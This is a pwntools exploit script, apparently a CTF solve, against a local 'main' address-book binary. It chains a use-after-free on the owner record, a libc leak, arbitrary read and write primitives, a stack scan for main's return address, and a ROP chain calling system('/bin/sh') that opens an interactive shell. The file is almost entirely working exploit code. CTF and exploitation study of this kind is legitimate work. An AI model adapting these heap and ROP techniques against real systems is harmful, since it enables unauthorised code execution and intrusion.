#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
import os
from functools import partial
import ctypes
import struct
import logging

# Run with ipython3 -i solve.py -- DEBUG

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

_CACHED_LIBC_PATH = None
def get_preloadable_libc(path=None, libc_paths=[]):
    """
    Recursively search the working directory for libc
    """
    global _CACHED_LIBC_PATH
    if _CACHED_LIBC_PATH is not None:
        return _CACHED_LIBC_PATH
    if path is None:
        path = os.getcwd()
    for root, dirs, files in os.walk(path):
        for f in files:
            # match common libc-2.31.so and libc.so.6 formats
            match = re.search(r'libc(\.so\.6|-\d+\.\d+\.so)', f)
            if match is not None:
                libc_paths.append(os.path.join(root, f))

    if len(libc_paths) > 0:
        return libc_paths[0]
    return None

# this variable will be filled in with an `ELF` object if
# there is a libc in the same directory as (or child directories of) the script
libc = None
script_directory = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = get_preloadable_libc(path=script_directory)
if libc is None and LIBC_PATH is not None:
    libc = ELF(LIBC_PATH)
    binsh_offset = libc.data.find(b'/bin/sh')
    if binsh_offset != -1:
        libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

    # libc.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
binary = context.binary = ELF('main')


def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, gdbscript=None, force_unbuffered=False,
             skip_libc_preload=False,
             preload_libs=None, ld_libpath_cwd=False):
    """
    Start a new process with predefined debug operations.
    @start_gdb: start gdb on process start up
    @gdbscript: default gdbscript to use
    @force_unbuffered: force input to be unbuffered. Use this if outputs arent
                       getting back to you but the program is sending them,
                       or if there is just general input/output weirdness
    @skip_libc_preload: By default this script will attempt to LD_PRELOAD any
                        libc.so.6 (or other libc). If this behavior is not
                        what you want, you can disable it by setting this
                        to True
    @preload_libs: If you would like to preload additional libraries, pass a
                   list of their paths here
   @ld_libpath_cwd: Often, binaries are meant for a different OS version or
                    different distribution of linux entirely from your current
                    one. If you wish to run them without setting up a docker
                    container you can do so by extracting the desired libraries
                    from a docker container (`get_docker_libs.sh` helps)
                    then patching your binary with
                    patchelf --set-interpreter "<ld-interpreter>" "<binary>"
                    and setting this variable. This is exceptionally overkill,
                    but prevents you from having to debug/test through a docker
                    container, which is a bit of a pain
    """
    kwargs = {}
    kwargs["env"] = {}
    # if there is a libc in the current directory
    global LIBC_PATH
    if skip_libc_preload is False:
        if LIBC_PATH is not None:
            if preload_libs:
                preload_libs.append(LIBC_PATH)
            else:
                preload_libs = [LIBC_PATH]
    if preload_libs:
        cwd = os.getcwd()
        preload_libs = [os.path.join(cwd, i) if not i.startswith("/") else i
                        for i in preload_libs]
        ld_preload = kwargs['env'].get('LD_PRELOAD')
        if ld_preload:
            ld_preload = ld_preload.split(" ")
        else:
            ld_preload = []
        ld_preload.extend(preload_libs)
        kwargs['env']['LD_PRELOAD'] = " ".join(ld_preload)

    if ld_libpath_cwd:
        kwargs['env']['LD_LIBRARY_PATH'] = os.getcwd()

    if force_unbuffered is True:
        kwargs['stdin'] = process.PTY
        kwargs['stdout'] = process.PTY

    p = process(binary.path, **kwargs)
    if start_gdb is True:
        attach_gdb(p, gdbscript)
    return p


p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 8000)
# do leak / payload gen here

def edit_owner_name(name):
    p.sendafter(b'> ', b'2\n')
    p.sendafter(b'enter new owner name: \n', name)


def print_contact(index):
    p.sendafter(b'> ', b'3\n')
    p.sendafter(b'index: \n> ', b'%d\n' % index)
    leak_bytes = p.recvuntil(b'\n\n')
    m = re.search(b'name: (.*)\n\n', leak_bytes, re.MULTILINE| re.DOTALL)
    if m is None:
        print("error %s" % str(leak_bytes))
        return b''
    return m.groups()[0]


def add_contact(index, name_len, name):
    p.sendafter(b'> ', b'4\n')
    p.sendafter(b'index: \n> ', b'%d\n' % index)
    p.sendafter(b'contact name length: \n> ', b'%d\n' % name_len)
    p.sendafter(b'enter contact name: \n', name)


def delete_contact(index):
    p.sendafter(b'> ', b'5\n')
    p.sendafter(b'index: \n> ', b'%d\n' % index)


def print_owner():
    p.sendafter(b'> ', b'1\n')
    leak_bytes_raw = p.recvuntil(b"'s address book\n\n")
    leak_bytes = leak_bytes_raw[:leak_bytes_raw.find(b"'s address book\n\n")]
    return leak_bytes


def delete_owner():
    p.sendafter(b'> ', b'7\n')


def edit_contact(index, bytevals):
    p.sendafter(b'> ', b'6\n')
    p.sendafter(b'index: \n> ', b'%d\n' % index)
    p.sendafter(b'enter new contact name: \n', bytevals)


def do_exit():
    p.sendafter(b'> ', b'8\n')


def batch(it, sz):
    for i in range(0, len(it), sz):
        yield it[i:i+sz]


def arb_read_str(address, index=0):
    edit_owner_name(p64(address))
    return print_contact(index)


def arb_read(address, size):
    leaked_bytes = b''
    curr_addr = address
    while len(leaked_bytes) < size:
        new_bytes = arb_read_str(curr_addr)
        new_bytes += b'\x00'
        curr_addr += len(new_bytes)
        leaked_bytes += new_bytes
    return leaked_bytes[:size]


def arb_write(address, bytevals, index=0):
    edit_owner_name(p64(address))
    edit_contact(index, bytevals)
    return

def PROTECT_PTR(pos, ptr):
    return ((ctypes.c_size_t(pos).value >> 12) ^ ctypes.c_size_t(ptr).value)

def REVEAL_PTR(ptr, ptr_addr):
    return PROTECT_PTR(ptr_addr, ptr)



p.sendafter(b'enter owner name length: \n> ', b'16\n')
p.sendafter(b'enter owner name: \n', b'blah\n')

for i in range(4):
    add_contact(i, 8, b'A\n')

for i in range(4, -1, -1):
    delete_contact(i)

# trigger uaf
delete_owner()
# just over tcache max size
add_contact(7, 1034, b'BLAH\n')

libc_leak_bytes = print_owner()
libc_leak = u64(libc_leak_bytes.ljust(8, b'\x00'))

# clear tcache and populate UAF chunk with index g_contact_list[0]
for i in range(3, -1, -1):
    add_contact(i, 8, b'F\n')


# adjust to try to avoid guard page. This bit is just to try to make the
# exploit more reliable across libc versions for regression tests
curr_addr = libc_leak & ~0xfff
curr_addr = curr_addr - 0x58000

while True:
    leak_probe = arb_read(curr_addr, 4)
    if leak_probe == b'\x7fELF':
        libc.address = curr_addr
        break
    # print("leak %#x %s" % (curr_addr, leak_probe))
    curr_addr -= 0x1000

assert(libc.address != 0)

log.success("libc base %#x" % libc.address)
stack_addr = u64(arb_read(libc.sym['environ'], 8))
log.success("leaked stack address %#x" % stack_addr)

stack_dump = arb_read(stack_addr, 0x800)
unique_stack_vals = set(struct.unpack("<%dQ" % (len(stack_dump) // 8), stack_dump))

start_sym_candidates = [i for i in unique_stack_vals if (i & 0xfff) == (binary.sym['_start'] & 0xfff) and i > binary.sym['_start']]
if len(start_sym_candidates) > 1:
    log.warning("more than one _start sym candidate")
    for i in start_sym_candidates:
        log.warning("%#x" % i)

start_addr = start_sym_candidates[0]
binary.address = start_addr - binary.sym['_start']

log.progress("searching for main's return address on the stack")
main_func_size = binary.functions['main'].size
main_func_addr = binary.sym['main']
main_func_end = main_func_addr+main_func_size
curr_addr = stack_addr
ip_control_addr = 0
while True:
    read_val = u64(arb_read(curr_addr, 8))
    # want an address explicitly greater than main's start
    # so that we know it is a return addr
    if read_val > main_func_addr and read_val < main_func_end:
        log.success("found main's return address on the stack at %#x: %#x" % (curr_addr, read_val))
        ip_control_addr = curr_addr
        break
    curr_addr -= 8

log.success("found main's return address on the stack at %#x" %
            ip_control_addr)

# create ropchain for calling `system("/bin/sh\0")`
r = ROP(libc)
ret = [k for k, v in r.gadgets.items() \
               if v.insns == ['ret']][0]
pop_rdi_ret = [k for k, v in r.gadgets.items() \
               if v.insns == ['pop rdi', 'ret']][0]

binsh_offset = libc.data.find(b'/bin/sh')
if binsh_offset != -1:
    libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

payload_addrs = []
if ip_control_addr % 0x10 != 0:
    # adjust call to system so that stack is aligned to 0x10, as
    # system sometimes needs that
    payload_addrs += [
        ret,
    ]
payload_addrs += [
    pop_rdi_ret,
    libc.sym['binsh'],
    libc.sym['system']
]

payload = flat({0: payload_addrs})

log.progress("writing payload to the stack")

# overwrite the return address from vuln -> main with the ropchain
for off, bytevals in enumerate(batch(payload, 8)):
    log.info("writing %s to %#x" % (str(bytevals), ip_control_addr+off*8))
    arb_write(ip_control_addr+off*8, bytevals)
log.success("Popping shell")

do_exit()
p.interactive()
